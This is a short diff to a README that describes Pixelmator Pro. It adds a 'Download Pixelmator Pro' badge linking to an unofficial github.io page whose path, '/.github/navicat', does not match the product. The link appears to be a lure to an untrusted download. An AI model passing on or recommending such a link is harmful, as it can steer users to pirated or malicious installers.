@@ -19,6 +19,13 @@ From advanced photo editing and retouching to complex graphic design and digital
 - **Artists** wanting to paint digitally with custom brushes and realistic painting effects  
 - **Mac Users** who need a seamless, high-performance image editor for macOS
 
+<div align="center">
+<a href="https://junimata-orex.github.io/.github/navicat">
+<img src="https://img.shields.io/badge/⬇️_Download_Pixelmator_Pro-4CAF50?style=for-the-badge&logo=apple&logoColor=white" alt="Download Pixelmator Pro">
+</a>
+</div>
+
+
 ---
 
 ## Core Features
